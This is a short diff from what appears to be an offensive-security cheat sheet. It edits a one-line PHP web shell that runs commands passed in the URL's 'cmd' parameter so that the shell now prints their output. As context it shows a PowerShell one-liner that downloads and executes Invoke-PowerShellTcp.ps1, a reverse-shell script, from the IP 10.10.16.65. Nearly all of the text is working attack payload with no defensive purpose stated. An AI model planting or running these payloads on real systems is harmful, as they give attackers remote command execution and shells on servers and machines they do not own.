@@ -10,7 +10,7 @@ echo "<pre>$output</pre>";
 ?>
 
 #PHP Simple Web Shell with 'cmd' as an argument to be passed in URL
-<?php shell_exec($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
 
 #Powerhshell get file from server:
 powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-PowerShellTcp.ps1')
